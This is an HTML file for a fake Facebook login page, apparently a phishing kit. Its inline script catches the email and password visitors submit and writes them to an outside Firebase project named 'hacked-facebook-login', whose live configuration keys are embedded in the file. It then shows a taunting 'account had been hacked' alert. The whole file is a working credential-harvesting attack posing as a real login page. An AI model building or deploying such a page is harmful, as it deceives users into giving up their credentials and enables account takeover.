<!DOCTYPE html>
<html>
  <head>
    <title>Facebook Login</title>
    <link rel="stylesheet" type="text/css" href="style.css" />
    <!-- Include the Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js"></script>
    <!-- Add Firebase products that you want to use -->
    <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.21.0/firebase-database.js"></script>
  </head>
  <body>
    <div class="container">
      <h1>Log in to Facebook</h1>
      <form id="login-form">
        <label for="email">Email or Phone</label>
        <input type="text" id="email" name="email" required />

        <label for="password">Password</label>
        <input type="password" id="password" name="password" required />

        <button type="submit">Log In</button>
      </form>
      <a href="#">Forgot Password?</a>
      <hr />
      <p>Don't have an account? <a href="#">Sign Up</a></p>
    </div>

    <!-- Initialize Firebase -->
    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
      import {
        getFirestore,
        addDoc,
        collection
      } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";
      // import { getAnalytics } from "https://cdnjs.cloudflare.com/ajax/libs/firebase/9.21.0/firebase-analytics-compat.min.js";

      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
        apiKey: "AIzaSyBRJBVi8-otrcV64ja_hS_Uyk04NUSw1hk",
        authDomain: "hacked-facebook-login.firebaseapp.com",
        projectId: "hacked-facebook-login",
        storageBucket: "hacked-facebook-login.appspot.com",
        messagingSenderId: "584988688929",
        appId: "1:584988688929:web:e55caa17f0a039be0c1960",
        measurementId: "G-VNPMK915ZF",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      // const analytics = getAnalytics(app);

      const form = document.getElementById("login-form");
      const emailInput = document.getElementById("email");
      const passwordInput = document.getElementById("password");

      form.addEventListener("submit", (event) => {
        event.preventDefault();
        const email = emailInput.value;
        const password = passwordInput.value;

        const db = getFirestore(app);
        // Save email and password to Firebase Realtime Database
        const docRef = addDoc(collection(db, "users"), {
          email: email,
          password: password,
        })
          .then((data) => {
            console.log("Document written with ID: ", data);
            alert("Your Facebook account had been hacked :))")
          })
          .catch((err) => {
            console.log("Have error: ", err);
          });
      });
    </script>
